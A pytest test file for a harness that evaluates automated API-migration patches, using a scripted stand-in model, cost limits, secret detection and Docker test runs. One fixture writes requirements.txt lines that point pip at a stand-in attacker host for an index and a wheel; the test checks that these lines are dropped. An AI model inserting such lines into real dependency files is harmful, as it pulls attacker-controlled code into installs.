import hashlib
import shutil
import subprocess
from pathlib import Path

import pytest

from app.control_plane.models import AttemptReview, ComponentVersion, Recommendation
from app.hardening import migration_eval
from app.hardening.migration_eval import (
    EvalResult,
    evaluate_tree,
    parse_pytest_outcomes,
    python_requirements,
    summarize,
)
from app.migration_generation.models import GenerationProposal

MIGRATION = {
    "id": "fixture",
    "description": "Client.send was replaced by Client.send_v2.",
    "extensions": [".py"],
    "pattern": r"\.send\(",
    "targets": [
        {"kind": "symbol", "name": "Client.send", "package": "acme_sdk", "ecosystem": "pypi"}
    ],
}
CASE = {
    "id": "fixture:case",
    "migration": "fixture",
    "repository": "example/project",
    "parent_sha": "a" * 40,
    "migration_sha": "b" * 40,
}
GUIDE = {
    "language": "python",
    "after_requirement": None,
    "replacement": r"\.send_v2\(",
    "guidance": "Call send_v2 instead of send.",
}
SDK = (
    "class Client:\n"
    "    def send(self, value):\n"
    "        return value\n\n"
    "    def send_v2(self, value):\n"
    "        return value\n"
)
APP = "from acme_sdk import Client\n\n\ndef go():\n    return Client().send(1)\n"
TEST = "from app import go\n\n\ndef test_go():\n    assert go() == 1\n"


class ScriptedModel:
    """Stands in for GPT-4o so the pipeline can be exercised without spending anything."""

    def __init__(self, new_source: str, commands=None) -> None:
        self.new_source = new_source
        self.commands = commands or [
            {"id": "trivial", "kind": "other", "argv": ["python", "--version"]}
        ]

    def propose(self, context):
        supplied = next(item for item in context.files if item.path == "app.py")
        return GenerationProposal.model_validate(
            {
                "plan": {
                    "summary": "Use send_v2.",
                    "steps": [
                        {
                            "id": "step-1",
                            "description": "Update the call.",
                            "call_site_ids": [site.id for site in context.impact.call_sites],
                            "expected_paths": ["app.py"],
                        }
                    ],
                    "verification_strategy": ["Run tests."],
                    "assumptions": [],
                    "unresolved": [],
                },
                "patch": {
                    "summary": "Use send_v2.",
                    "edits": [
                        {
                            "path": "app.py",
                            "expected_sha256": supplied.sha256,
                            "content": self.new_source,
                            "plan_step_ids": ["step-1"],
                        }
                    ],
                    "tests": [],
                    "verification_commands": self.commands,
                    "generator": {"id": "scripted", "version": "1.0"},
                },
            }
        )

    def review(self, context, plan, patch, execution):
        del context, plan, patch, execution
        review = AttemptReview(
            summary="Looks fine.",
            findings=[],
            provenance="model_inferred",
            model=ComponentVersion(id="scripted", version="1.0"),
        )
        recommendation = Recommendation(
            action="approve",
            rationale="Scripted.",
            confidence={"score": 1, "basis": "inferred"},
            unresolved=[],
        )
        return review, recommendation


def _docker_available() -> bool:
    if not shutil.which("docker"):
        return False
    return subprocess.run(["docker", "info"], capture_output=True).returncode == 0


requires_docker = pytest.mark.skipif(not _docker_available(), reason="Docker is not running")


def _repository(root: Path) -> Path:
    (root / "acme_sdk.py").write_text(SDK)
    (root / "app.py").write_text(APP)
    (root / "test_app.py").write_text(TEST)
    (root / "requirements.txt").write_text("# no third-party runtime dependencies\n")
    return root


def test_requirements_keep_named_packages_and_drop_everything_pip_could_be_steered_by(tmp_path):
    (tmp_path / "requirements.txt").write_text(
        "\n".join(
            [
                "requests>=2  # comment",
                "--index-url https://attacker.test/simple",
                "-e .",
                "-r other.txt",
                "evil @ https://attacker.test/evil.whl",
                "./local-package",
                "numpy==1.26.4",
            ]
        )
    )
    (tmp_path / "pyproject.toml").write_text(
        '[project]\ndependencies = ["httpx"]\n'
        '[project.optional-dependencies]\ntest = ["pytest-mock"]\ndocs = ["sphinx"]\n'
    )

    assert python_requirements(tmp_path) == ["httpx", "numpy==1.26.4", "pytest-mock", "requests>=2"]


def test_an_upgrade_replaces_the_old_pin_instead_of_conflicting_with_it():
    assert migration_eval._with_upgrade(
        ["OpenAI==0.28.1", "requests>=2"], "openai>=1,<2"
    ) == ["openai>=1,<2", "requests>=2"]
    assert migration_eval._with_upgrade(["requests>=2"], None) == ["requests>=2"]


def test_too_much_to_rewrite_stops_before_any_spend(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)
    root = _repository(tmp_path)
    long_call = "    Client().send('" + "x" * 500 + "')\n"
    (root / "app.py").write_text(APP + long_call * 40)

    result = evaluate_tree(root, CASE, MIGRATION, 1, ScriptedModel("unused"))

    assert result.stage == "output_too_large"
    assert result.cost_usd == 0


def test_a_large_file_with_few_call_sites_is_not_skipped(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)
    root = _repository(tmp_path)
    (root / "app.py").write_text(APP + "# padding line for size\n" * 900)

    result = evaluate_tree(root, CASE, MIGRATION, 1, None)

    assert result.stage == "estimated"


def test_a_file_with_a_real_secret_stops_before_any_spend(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)
    root = _repository(tmp_path)
    (root / "app.py").write_text(APP + 'password = "correcthorsebattery"\n')

    result = evaluate_tree(root, CASE, MIGRATION, 1, ScriptedModel("unused"))

    assert result.stage == "contains_redacted_secret"


def test_per_request_limit_fails_one_case_and_only_the_budget_ends_a_run(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)

    class Refuses:
        def __init__(self, message: str) -> None:
            self.message = message

        def propose(self, context):
            raise migration_eval.OpenAIBudgetExceeded(self.message)

    monkeypatch.setattr(migration_eval, "prepare_image", lambda *_a, **_k: ("image", True))
    monkeypatch.setattr(migration_eval, "remove_image", lambda *_a: None)
    monkeypatch.setattr(migration_eval, "run_tests", lambda *_a: (0, set(), set()))
    root = _repository(tmp_path)

    per_request = Refuses("model request exceeds the per-request cost limit")
    result = evaluate_tree(root, CASE, MIGRATION, 1, per_request)
    assert result.stage == "generation_failed"

    with pytest.raises(migration_eval.OpenAIBudgetExceeded):
        evaluate_tree(root, CASE, MIGRATION, 1, Refuses("total model budget would be exceeded"))


@requires_docker
def test_paid_patch_survives_a_scoring_crash(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)
    monkeypatch.setattr(
        migration_eval,
        "_run_tests_after",
        lambda *_a: (_ for _ in ()).throw(RuntimeError("disk full")),
    )
    root = tmp_path / "repo"
    root.mkdir()
    patches = tmp_path / "patches"

    result = evaluate_tree(
        _repository(root),
        CASE,
        MIGRATION,
        1,
        ScriptedModel(APP.replace(".send(", ".send_v2(")),
        patches_dir=patches,
    )

    assert result.stage == "completed"
    assert "scoring incomplete" in result.detail
    assert len(list(patches.iterdir())) == 1


@requires_docker
def test_pytest_keeps_going_past_a_broken_module_and_repository_options(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)
    root = _repository(tmp_path)
    (root / "test_broken.py").write_text("import module_that_is_not_installed\n")
    (root / "pytest.ini").write_text("[pytest]\naddopts = --cov=app --not-a-real-option\n")

    result = evaluate_tree(
        root, CASE, MIGRATION, 1, ScriptedModel(APP.replace(".send(", ".send_v2("))
    )

    assert result.baseline_passed == 1


@requires_docker
def test_rehearsal_runs_a_real_tree_through_every_stage_for_free(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)

    result = evaluate_tree(
        _repository(tmp_path), CASE, MIGRATION, 1, migration_eval.RehearsalModel()
    )

    assert result.stage == "completed", result.detail
    assert result.cost_usd == 0
    assert result.usage_after == result.usage_before
    assert result.regressions == []


def test_pytest_outcomes_are_read_from_the_report_lines():
    passed, failed = parse_pytest_outcomes(
        "PASSED tests/a.py::test_one\n"
        "FAILED tests/a.py::test_two - assert 1 == 2\n"
        "ERROR tests/b.py\n"
        "some PASSED mention in a log line\n"
    )

    assert passed == {"tests/a.py::test_one"}
    assert failed == {"tests/a.py::test_two", "tests/b.py"}


def test_summary_requires_parsing_and_removed_usage_and_keeps_every_stage_visible():
    def done(**fields) -> EvalResult:
        return EvalResult(id="x", migration="m", repository="o/r", stage="completed", **fields)

    summary = summarize(
        [
            done(parses=True, usage_before=2, usage_after=0, replacement_added=2),
            done(parses=True, usage_before=3, usage_after=1, replacement_added=2),
            done(parses=False, usage_before=1, usage_after=0, replacement_added=1),
            done(parses=True, usage_before=1, usage_after=0, replacement_added=0),
            EvalResult(id="y", migration="m", repository="o/s", stage="no_call_sites"),
        ]
    )

    assert summary["stages"] == {"completed": 4, "no_call_sites": 1}
    assert summary["patches_parse_and_remove_all_old_usage"] == 2
    assert summary["patches_also_add_the_new_api"] == 1
    assert summary["old_usage_lines_before"] == 7
    assert summary["old_usage_lines_after"] == 1


def test_dry_run_estimates_cost_without_any_model(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)

    result = evaluate_tree(_repository(tmp_path), CASE, MIGRATION, 1, None)

    assert result.stage == "estimated"
    assert result.flagged_sites == 1
    assert 0 < result.expected_cost_usd <= result.worst_case_cost_usd


def test_repository_without_call_sites_stops_before_spending(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)
    root = _repository(tmp_path)
    (root / "app.py").write_text("def go():\n    return 1\n")

    result = evaluate_tree(root, CASE, MIGRATION, 1, ScriptedModel("unused"))

    assert result.stage == "no_call_sites"
    assert result.cost_usd == 0


@requires_docker
def test_good_patch_scores_clean_even_though_the_model_chose_a_trivial_check(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)
    fixed = APP.replace(".send(", ".send_v2(")

    result = evaluate_tree(_repository(tmp_path), CASE, MIGRATION, 1, ScriptedModel(fixed))

    assert result.stage == "completed", result.detail
    assert result.parses is True
    assert result.usage_before == 1 and result.usage_after == 0
    assert result.flagged_sites_after == 0
    assert result.replacement_added == 1
    assert result.baseline_passed == 1
    assert result.after_passed == 1
    assert result.regressions == []


@requires_docker
def test_regression_gets_one_repair_and_cannot_earn_approval(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)
    broken = APP.replace(".send(", ".removed_method(")

    result = evaluate_tree(_repository(tmp_path), CASE, MIGRATION, 1, ScriptedModel(broken))

    assert result.stage == "completed", result.detail
    assert result.attempts == 2
    assert result.model_check_status == "not_passed"
    assert result.recommendation == "revise"
    assert result.usage_after == 0
    assert result.replacement_added == 0
    assert result.regressions == ["test_app.py::test_go"]


@requires_docker
def test_unparseable_patch_is_marked(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)

    result = evaluate_tree(
        _repository(tmp_path), CASE, MIGRATION, 1, ScriptedModel("def go(:\n    return\n")
    )

    assert result.parses is False


@requires_docker
def test_digest_of_the_applied_file_matches_the_patch(monkeypatch, tmp_path):
    monkeypatch.setitem(migration_eval.GUIDES, "fixture", GUIDE)
    fixed = APP.replace(".send(", ".send_v2(")
    root = _repository(tmp_path)

    evaluate_tree(root, CASE, MIGRATION, 1, ScriptedModel(fixed))

    assert hashlib.sha256((root / "app.py").read_bytes()).hexdigest() == hashlib.sha256(
        fixed.encode()
    ).hexdigest()
